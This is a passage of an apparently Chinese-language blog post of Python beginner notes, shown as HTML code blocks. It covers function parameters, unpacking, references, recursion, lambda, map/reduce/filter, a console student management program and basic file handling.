return_num():</span><br><span class=\"line\">    # return 1, 2 # 返回的默认是元组，还可以是列表，字典</span><br><span class=\"line\">    # return (10, 20)</span><br><span class=\"line\">    # return [100, 200]</span><br><span class=\"line\">    return &#123;&#x27;name&#x27;: &#x27;python&#x27;, &#x27;age&#x27;: 30&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">result = return_num()</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数参数之位置参数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 位置参数：调用函数时根据函数定义的参数位置来传递参数</span><br><span class=\"line\"># 传递和定义参数的顺序及个数必须一致</span><br><span class=\"line\"></span><br><span class=\"line\">def user_info(name, age, gender):</span><br><span class=\"line\">    print(f&#x27;your name is &#123;name&#125;, age is &#123;age&#125;, gender is &#123;gender&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># user_info(&#x27;TOM&#x27;, 20, &#x27;male&#x27;)</span><br><span class=\"line\"># user_info(&#x27;TOM&#x27;, 20) # 个数不一致会报错</span><br><span class=\"line\">user_info(20, &#x27;TOM&#x27;, &#x27;male&#x27;) # 顺序必须一致，否则无意义</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数参数之关键字参数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 关键字参数通过“键=值”加以指定</span><br><span class=\"line\"># 如果有位置参数时，位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序</span><br><span class=\"line\"></span><br><span class=\"line\">def user_info(name, age, gender):</span><br><span class=\"line\">    print(f&#x27;your name is &#123;name&#125;, age is &#123;age&#125;, gender is &#123;gender&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">user_info(&#x27;rose&#x27;, age=20, gender=&#x27;female&#x27;)</span><br><span class=\"line\">user_info(&#x27;xiaoming&#x27;, gender=&#x27;male&#x27;, age=18)</span><br><span class=\"line\"># user_info(age=20, gender=&#x27;male&#x27;, &#x27;TOM&#x27;) # 位置参数在关键字参数之后会报错</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数参数之缺省参数--------------&#x27;)</span><br><span class=\"line\"># 即默认参数，用于定义函数，为参数提供默认值，调用函数时可不传该默认参数的值</span><br><span class=\"line\"># 所有位置参数必须在默认参数前，包括函数定义和调用</span><br><span class=\"line\"></span><br><span class=\"line\">def user_info(name, age, gender=&#x27;male&#x27;):</span><br><span class=\"line\">    print(f&#x27;your name is &#123;name&#125;, age is &#123;age&#125;, gender is &#123;gender&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">user_info(&#x27;TOM&#x27;, 20) # 没有为缺省参数传值，使用默认参数的值</span><br><span class=\"line\">user_info(&#x27;rose&#x27;, 18, &#x27;female&#x27;) # 如果为缺省参数传值，则修改该默认参数的值</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------函数参数之不定长参数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 用于不确定传递多少个参数的场景，可用包裹位置参数，或者包裹关键字参数</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 包裹位置传递</span><br><span class=\"line\"># 接收所有位置参数，返回一个元组</span><br><span class=\"line\">def user_info(*args):</span><br><span class=\"line\">    print(args)</span><br><span class=\"line\"></span><br><span class=\"line\">user_info(&#x27;TOM&#x27;)</span><br><span class=\"line\">user_info(&#x27;TOM&#x27;, 20)</span><br><span class=\"line\">user_info(&#x27;TOM&#x27;, 20, &#x27;man&#x27;)</span><br><span class=\"line\">user_info()</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 包裹关键字传递</span><br><span class=\"line\"># 接收所有关键字参数，返回一个字典</span><br><span class=\"line\">def user_info(**kwargs):</span><br><span class=\"line\">    print(kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">user_info()</span><br><span class=\"line\">user_info(name=&#x27;TOM&#x27;)</span><br><span class=\"line\">user_info(name=&#x27;TOM&#x27;, age=20)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"拆包和交换变量值\"><a href=\"#拆包和交换变量值\" class=\"headerlink\" title=\"拆包和交换变量值\"></a>拆包和交换变量值</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------拆包--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 拆包元组数据</span><br><span class=\"line\">def return_num():</span><br><span class=\"line\">    return 100, 200</span><br><span class=\"line\"></span><br><span class=\"line\">result = return_num()</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">num1, num2 = return_num() # 用多个变量接收元组数据</span><br><span class=\"line\">print(num1)</span><br><span class=\"line\">print(num2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 拆包字典数据</span><br><span class=\"line\">dict1 = &#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">a, b = dict1 # 变量存储的数据是key值</span><br><span class=\"line\"></span><br><span class=\"line\">print(a)</span><br><span class=\"line\">print(b)</span><br><span class=\"line\">print(dict1[a])</span><br><span class=\"line\">print(dict1[b])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------交换变量值--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a = 10</span><br><span class=\"line\">b = 20</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 方法一：借助第三变量存储数据</span><br><span class=\"line\">c = 0</span><br><span class=\"line\">c = a</span><br><span class=\"line\">a = b</span><br><span class=\"line\">b = c</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">print(b)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 方法二：</span><br><span class=\"line\">a, b = 1, 2</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">print(b)</span><br><span class=\"line\"></span><br><span class=\"line\">a, b = b, a</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">print(b)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在python中，值是靠引用来传递的</span><br><span class=\"line\"># 可以用id()来判断两个变量是否为同一个值的引用，可以将id值理解为那块内存的地址标识</span><br><span class=\"line\"></span><br><span class=\"line\"># 可变与不可变</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 1. 不可变：int:  1.1 声明变量保存整型数据，把这个数据赋值到另一个变量，</span><br><span class=\"line\"># id()检测两个变量的id值（内存的十进制值）</span><br><span class=\"line\">a = 1</span><br><span class=\"line\">b = a</span><br><span class=\"line\">print(b)</span><br><span class=\"line\">print(id(a))</span><br><span class=\"line\">print(id(b)) # a和b的id值相同</span><br><span class=\"line\"># 修改a的数据测试id值</span><br><span class=\"line\">a = 2</span><br><span class=\"line\"></span><br><span class=\"line\">print(b)</span><br><span class=\"line\">print(id(a)) # 修改了a的值，则内存地址也改变</span><br><span class=\"line\">print(id(b))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 可变类型：列表</span><br><span class=\"line\">aa = [10, 20]</span><br><span class=\"line\">bb = aa</span><br><span class=\"line\"></span><br><span class=\"line\">print(bb)</span><br><span class=\"line\">print(id(aa))</span><br><span class=\"line\">print(id(bb))</span><br><span class=\"line\"></span><br><span class=\"line\">aa.append(30)</span><br><span class=\"line\">print(aa)</span><br><span class=\"line\">print(bb) # 列表是可变类型，aa改变则bb也同样改变，修改aa是修改的列表原数据</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(aa))</span><br><span class=\"line\">print(id(bb)) # 值改变，而内存地址不变</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------引用当作实参--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求： 验证引用是否可以当作实参</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">1. 定义函数：有形参</span><br><span class=\"line\">    1.1 访问打印形参看是否有数据</span><br><span class=\"line\">    1.2 访问形参的id</span><br><span class=\"line\">    1.3 改变形参的数据，查看这个形参并打印id，看id值是否相同</span><br><span class=\"line\">2. 调用函数 -- 把可变与不可变两种类型依次当作实参传入</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def test1(a):</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\">    print(id(a))</span><br><span class=\"line\"></span><br><span class=\"line\">    a += a</span><br><span class=\"line\">    print(a)</span><br><span class=\"line\">    print(id(a))</span><br><span class=\"line\"></span><br><span class=\"line\">b = 100</span><br><span class=\"line\">test1(b) # id值改变，不可变类型</span><br><span class=\"line\"></span><br><span class=\"line\">c = [11, 22]</span><br><span class=\"line\">test1(c) # id值不改变，可变类型</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------可变与不可变类型--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 可变类型：原数据能够直接进行修改</span><br><span class=\"line\">包括列表，字典，集合</span><br><span class=\"line\"></span><br><span class=\"line\"># 不可变类型：原数据不能够直接进行修改</span><br><span class=\"line\">包括整型，浮点型，字符串，元组</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 递归是一种编程思想，通常用在遍历一个文件夹下面的所有文件，或快速排序算法等等</span><br><span class=\"line\"># 特点：1. 函数内部自己调用自己。 2. 必须有出口</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------递归之回顾函数返回值--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># return 返回的位置: 函数调用的位置</span><br><span class=\"line\"></span><br><span class=\"line\"># 应用：3 以内数字累加和</span><br><span class=\"line\"></span><br><span class=\"line\">def sum_numbers(num):</span><br><span class=\"line\">    # 2. 出口 -- 如果没有出口则报错：超出最大递归深度</span><br><span class=\"line\">    if num == 1:</span><br><span class=\"line\">        return 1</span><br><span class=\"line\"></span><br><span class=\"line\">    # 1. 当前数字 + 当前数字-1的累加和(函数内部自己调用自己)</span><br><span class=\"line\">    return num + sum_numbers(num-1)</span><br><span class=\"line\"></span><br><span class=\"line\">result = sum_numbers(3)</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"函数加强之应用：学员管理系统\"><a href=\"#函数加强之应用：学员管理系统\" class=\"headerlink\" title=\"函数加强之应用：学员管理系统\"></a>函数加强之应用：学员管理系统</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 定义显示界面函数</span><br><span class=\"line\">def info_print():</span><br><span class=\"line\">    print(&#x27;please choose items-------&#x27;)</span><br><span class=\"line\">    print(&#x27;1. add student&#x27;)</span><br><span class=\"line\">    print(&#x27;2. delete student&#x27;)</span><br><span class=\"line\">    print(&#x27;3. modify student&#x27;)</span><br><span class=\"line\">    print(&#x27;4. query student&#x27;)</span><br><span class=\"line\">    print(&#x27;5. display all students&#x27;)</span><br><span class=\"line\">    print(&#x27;6. exit&#x27;)</span><br><span class=\"line\">    print(&#x27;-&#x27; *20)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 声明一个空列表存储所有学员的信息</span><br><span class=\"line\">info = []</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 添加学员信息的函数</span><br><span class=\"line\">def add_info():</span><br><span class=\"line\">    &quot;&quot;&quot;添加学员函数&quot;&quot;&quot;</span><br><span class=\"line\">    # 1. 用户输入：学号，姓名，手机号</span><br><span class=\"line\">    new_id = input(&#x27;please input student id:  &#x27;)</span><br><span class=\"line\">    new_name = input(&#x27;please input student name:  &#x27;)</span><br><span class=\"line\">    new_tel = input(&#x27;please input student tel:  &#x27;)</span><br><span class=\"line\">    # 2. 判断是否添加这个学员：若存在则提示报错，否则添加这个学员</span><br><span class=\"line\">    global info</span><br><span class=\"line\">    # 2.1 不允许姓名重复：判断用户输入的姓名 和 列表里面字典的name对应的值 相等 提示</span><br><span class=\"line\">    for i in info:</span><br><span class=\"line\">        if new_name == i[&#x27;name&#x27;]:</span><br><span class=\"line\">            print(&#x27;The student is already exist&#x27;)</span><br><span class=\"line\">            return # 退出当前函数，不执行后面添加学员的代码</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2.2 如果输入的姓名不存在，添加数据：准备空字典，字典新增数据，列表追加字典</span><br><span class=\"line\">    info_dict = &#123;&#125;</span><br><span class=\"line\">    # 字典新增数据</span><br><span class=\"line\">    info_dict[&#x27;id&#x27;] = new_id</span><br><span class=\"line\">    info_dict[&#x27;name&#x27;] = new_name</span><br><span class=\"line\">    info_dict[&#x27;tel&#x27;] = new_tel</span><br><span class=\"line\">    # print(info_dict)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 列表追加字典</span><br><span class=\"line\">    info.append(info_dict)</span><br><span class=\"line\">    print(info)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 删除学员的函数</span><br><span class=\"line\">def del_info():</span><br><span class=\"line\">    &quot;&quot;&quot;删除学员函数&quot;&quot;&quot;</span><br><span class=\"line\">    # 1. 用户输入要删除的学员的姓名</span><br><span class=\"line\">    del_name = input(&#x27;please input the name you want to delete: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2. 判断学员是否存在，存在则删除，否则提示</span><br><span class=\"line\">    # 2.1 声明info为全局变量</span><br><span class=\"line\">    global info</span><br><span class=\"line\">    # 2.2 遍历列表</span><br><span class=\"line\">    for i in info:</span><br><span class=\"line\">    # 2.3 判断学员是否存在：存在执行删除（列表里面的字典），不存在提示</span><br><span class=\"line\">    #     存在该学员时，用break退出循环，因为该系统不允许重名</span><br><span class=\"line\">        if del_name == i[&#x27;name&#x27;]:</span><br><span class=\"line\">            # 列表删除数据 -- 按数据删除remove</span><br><span class=\"line\">            info.remove(i)</span><br><span class=\"line\">            break</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;The name you input is not exist&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(info)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 修改学员的函数</span><br><span class=\"line\">def mod_info():</span><br><span class=\"line\">    &quot;&quot;&quot;修改学员函数&quot;&quot;&quot;</span><br><span class=\"line\">    mod_name = input(&#x27;please input the name you want to modify: &#x27;)</span><br><span class=\"line\">    global info</span><br><span class=\"line\">    for i in info:</span><br><span class=\"line\">        if mod_name == i[&#x27;name&#x27;]:</span><br><span class=\"line\">            i[&#x27;name&#x27;] = input(&#x27;please input a new name: &#x27;)</span><br><span class=\"line\">            i[&#x27;id&#x27;] = input(&#x27;please input a new id: &#x27;)</span><br><span class=\"line\">            i[&#x27;tel&#x27;] = input(&#x27;please input a new tel: &#x27;)</span><br><span class=\"line\">            break</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;The name you input is not exist&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(info)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 查询学员函数</span><br><span class=\"line\">def query_info():</span><br><span class=\"line\">    &quot;&quot;&quot;查询学员函数&quot;&quot;&quot;</span><br><span class=\"line\">    query_name = input(&#x27;please input the name you want to query: &#x27;)</span><br><span class=\"line\">    global info</span><br><span class=\"line\">    for i in info:</span><br><span class=\"line\">        if query_name == i[&#x27;name&#x27;]:</span><br><span class=\"line\">            print(f&quot;the student you query has a name &#123;i[&#x27;name&#x27;]&#125;, an id &#123;i[&#x27;id&#x27;]&#125;, &quot;</span><br><span class=\"line\">                  f&quot;and a tel &#123;i[&#x27;tel&#x27;]&#125;&quot;) # 注意引号不能冲突（外部双引号，内部单引号）</span><br><span class=\"line\">            break</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;The name you input is not exist&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 显示所有学员函数</span><br><span class=\"line\">def display_info():</span><br><span class=\"line\">    &quot;&quot;&quot;显示所有学员函数&quot;&quot;&quot;</span><br><span class=\"line\">    print(&#x27;id\\tname\\ttel&#x27;) # \\t制表符对齐</span><br><span class=\"line\">    for i in info:</span><br><span class=\"line\">        print(f&quot;&#123;i[&#x27;id&#x27;]&#125;\\t&#123;i[&#x27;name&#x27;]&#125;\\t&#123;i[&#x27;tel&#x27;]&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 系统功能需要循环使用，直到用户输入6，才退出系统</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    # 1. 显示功能界面</span><br><span class=\"line\">    info_print()</span><br><span class=\"line\"></span><br><span class=\"line\">    # 2. 用户输入功能序号</span><br><span class=\"line\">    user_num = int(input(&#x27;please input item number: &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">    # 3. 按照用户输入的功能序号，执行不同的功能（函数）</span><br><span class=\"line\">    if user_num == 1:</span><br><span class=\"line\">        # print(&#x27;add&#x27;) -- 添加学员</span><br><span class=\"line\">        add_info()</span><br><span class=\"line\">    elif user_num == 2:</span><br><span class=\"line\">        # print(&#x27;delete&#x27;) -- 删除学员</span><br><span class=\"line\">        del_info()</span><br><span class=\"line\">    elif user_num == 3:</span><br><span class=\"line\">        # print(&#x27;modify&#x27;) -- 修改学员</span><br><span class=\"line\">        mod_info()</span><br><span class=\"line\">    elif user_num == 4:</span><br><span class=\"line\">        # print(&#x27;query&#x27;) -- 查询学员</span><br><span class=\"line\">        query_info()</span><br><span class=\"line\">    elif user_num == 5:</span><br><span class=\"line\">        # print(&#x27;display all&#x27;) -- 显示所有学员</span><br><span class=\"line\">        display_info()</span><br><span class=\"line\">    elif user_num == 6:</span><br><span class=\"line\">        # print(&#x27;exit&#x27;) -- 退出系统</span><br><span class=\"line\">        # 退出系统，终止while True循环用break</span><br><span class=\"line\">        exit_flag = input(&#x27;Are you sure exit system? Y or N: &#x27;)</span><br><span class=\"line\">        if ((exit_flag == &#x27;Y&#x27;) or (exit_flag == &#x27;y&#x27;)):</span><br><span class=\"line\">        # if exit_flag == (&#x27;Y&#x27; or &#x27;y&#x27;) -- 逻辑或无效表达式</span><br><span class=\"line\">            break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            continue</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;you\\&#x27;ve input a wrong number&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"lambda\"><a href=\"#lambda\" class=\"headerlink\" title=\"lambda\"></a>lambda</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 应用场景：一个函数有一个返回值，并且只有一句代码，可以使用lambda简化</span><br><span class=\"line\"># 语法：lambda 参数列表：表达式</span><br><span class=\"line\"># 注意：lambda表达式的参数可有可无，函数的参数在lambda表达式中完全适用。</span><br><span class=\"line\">#      lambda表达式能接收任何数量的参数但只能返回一个表达式的值</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------lambda体验--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：函数 返回值100</span><br><span class=\"line\"></span><br><span class=\"line\"># 1.函数</span><br><span class=\"line\">def fn1():</span><br><span class=\"line\">    return 100</span><br><span class=\"line\"></span><br><span class=\"line\">result = fn1()</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. lambda 匿名函数</span><br><span class=\"line\">fn2 = lambda: 100</span><br><span class=\"line\">print(fn2) # 打印的是lambda的内存地址</span><br><span class=\"line\">print(fn2()) # 调用函数，返回值100</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------lambda实例之计算两个数的和--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 函数实现</span><br><span class=\"line\">def add(a, b):</span><br><span class=\"line\">    return a + b</span><br><span class=\"line\"></span><br><span class=\"line\">result = add(1, 8)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># lambda实现</span><br><span class=\"line\">fn1 = lambda a, b: a + b</span><br><span class=\"line\">print(fn1(1, 8))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------lambda的参数形式--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 无参数</span><br><span class=\"line\">fn1 = lambda: 100</span><br><span class=\"line\">print(fn1())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 一个参数</span><br><span class=\"line\">fn1 = lambda a: a  # 前面的a是形参，后面的a是return的返回值</span><br><span class=\"line\">print(fn1(&#x27;hello world&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 默认参数(缺省参数)</span><br><span class=\"line\">fn1 = lambda a, b, c=100: a + b + c</span><br><span class=\"line\">print(fn1(10, 20))</span><br><span class=\"line\">print(fn1(10, 20, 200))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 4. 可变参数：*args -- 接收不定长位置参数，返回元组</span><br><span class=\"line\">fn1 = lambda *args: args</span><br><span class=\"line\">print(fn1(10, 20, 30))</span><br><span class=\"line\">print(fn1(10))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 5. 可变参数：**kwargs -- 接收不定长关键字参数, 返回字典</span><br><span class=\"line\">fn1 = lambda **kwargs: kwargs</span><br><span class=\"line\">print(fn1(name=&#x27;python&#x27;))</span><br><span class=\"line\">print(fn1(age=30))</span><br><span class=\"line\">print(fn1(name=&#x27;python&#x27;, age=30))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------lambda的应用--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 带判断的lambda</span><br><span class=\"line\">fn1 = lambda a, b: a if a &gt; b else b</span><br><span class=\"line\">print(fn1(100, 200))</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 2. 列表数据按字典key的值排序</span><br><span class=\"line\">students = [&#123;&#x27;name&#x27;: &#x27;TOM&#x27;, &#x27;age&#x27;: 20&#125;,</span><br><span class=\"line\">            &#123;&#x27;name&#x27;: &#x27;ROSE&#x27;, &#x27;age&#x27;: 19&#125;,</span><br><span class=\"line\">            &#123;&#x27;name&#x27;: &#x27;JACK&#x27;, &#x27;age&#x27;: 22&#125;,]</span><br><span class=\"line\"></span><br><span class=\"line\"># sort(key=lambda...., reverse=bool数据)</span><br><span class=\"line\"># （1） name key对应的值进行升序排序</span><br><span class=\"line\">students.sort(key=lambda x: x[&#x27;name&#x27;])</span><br><span class=\"line\">print(students)</span><br><span class=\"line\"></span><br><span class=\"line\"># （2） name key对应的值进行降序排序</span><br><span class=\"line\">students.sort(key=lambda x: x[&#x27;name&#x27;], reverse=True)</span><br><span class=\"line\">print(students)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># （3） age key对应的值进行降序排序</span><br><span class=\"line\">students.sort(key=lambda x: x[&#x27;age&#x27;], reverse=True)</span><br><span class=\"line\">print(students)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"高阶函数\"><a href=\"#高阶函数\" class=\"headerlink\" title=\"高阶函数\"></a>高阶函数</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 高阶函数：把函数作为参数传入</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------abs和round--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># abs()函数可以完成对数字求绝对值计算</span><br><span class=\"line\">print(abs(-10))</span><br><span class=\"line\"></span><br><span class=\"line\"># round()函数可以完成对数字的四舍五入计算</span><br><span class=\"line\">print(round(1.2))</span><br><span class=\"line\">print(round(1.9))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------体验高阶函数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：任意两个数字，先进行数字处理（绝对值或四舍五入）再求和计算</span><br><span class=\"line\"># 1. 写法一</span><br><span class=\"line\">def add_num(a, b):</span><br><span class=\"line\">    # 绝对值</span><br><span class=\"line\">    return abs(a) + abs(b)</span><br><span class=\"line\"></span><br><span class=\"line\">print(add_num(-1.1, 1.9))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 写法二：高阶函数</span><br><span class=\"line\">def sum_num(a ,b ,f):  # f是第三个参数，用来接收将来传入的函数</span><br><span class=\"line\">    return f(a) + f(b)</span><br><span class=\"line\"></span><br><span class=\"line\">print(sum_num(-1, 5, abs))</span><br><span class=\"line\">print(sum_num(1.2, 1.9, round))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------内置高阶函数之map()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># map(func, lst), 将传入的函数变量func作用到lst变量的每个元素中，</span><br><span class=\"line\"># 并将结果组成新的列表返回一个列表（python2）或 返回一个迭代器（python3）</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：计算list1序列中各个数字的2次方</span><br><span class=\"line\">list1 = [1, 2, 3, 4, 5]</span><br><span class=\"line\"></span><br><span class=\"line\">def func(x):</span><br><span class=\"line\">    return x ** 2</span><br><span class=\"line\"></span><br><span class=\"line\">result = map(func, list1)</span><br><span class=\"line\">print(result) # 打印的是迭代器result的地址</span><br><span class=\"line\">print(list(result)) # 用list()把迭代器result转换成列表</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------内置高阶函数之reduce()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># reduce(func, lst)，其中func必须有两个参数，每次func计算的结果继续和序列的下一个元素做累积计算</span><br><span class=\"line\"># 注意：reduce()传入的参数func必须接收2个参数</span><br><span class=\"line\"># 需求：计算list1序列中各个数字的累加和</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1, 2, 3, 4, 5]</span><br><span class=\"line\"></span><br><span class=\"line\">import functools # 导入模块</span><br><span class=\"line\"></span><br><span class=\"line\">def func(a, b):</span><br><span class=\"line\">    return a + b</span><br><span class=\"line\"></span><br><span class=\"line\">result = functools.reduce(func, list1)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------内置高阶函数之filter()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># filter(func, lst)函数用于过滤序列，过滤掉不符合条件的元素，返回一个filter对象。</span><br><span class=\"line\"># 如果要转换为列表，可以使用list()来转换。</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br><span class=\"line\"></span><br><span class=\"line\">def func(x):</span><br><span class=\"line\">    return x % 2 == 0</span><br><span class=\"line\"></span><br><span class=\"line\">result = filter(func, list1)</span><br><span class=\"line\">print(result) # 打印filter对象内存地址</span><br><span class=\"line\">print(list(result)) #list转换成列表打印</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"文件操作\"><a href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 文件操作的作用：把一些内容（数据）存储起来，可以让程序下一次执行的时候直接使用，</span><br><span class=\"line\"># 而不必重新制作一份，省时省力</span><br><span class=\"line\"># 步骤： 1. 打开文件，2. 读写等操作，3. 关闭文件。可以只打开和关闭文件，不进行任何读写操作</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------体验文件操作--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 打开用open()函数</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;w&#x27;)</span><br><span class=\"line\"># 读写操作 write() read()</span><br><span class=\"line\">f.write(&#x27;aaa&#x27;)</span><br><span class=\"line\"># 关闭 close()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------访问模式特点01--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># r: 如果文件不存在，报错: 不支持写入操作，表示只读</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\">f.close()</span><br><span class=\"line\">f.write(&#x27;aa&#x27;)</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># w: 只写，如果文件不存在，新建文件：执行写入，会覆盖原有内容</span><br><span class=\"line\">f = open(&#x27;1.txt&#x27;, &#x27;w&#x27;)</span><br><span 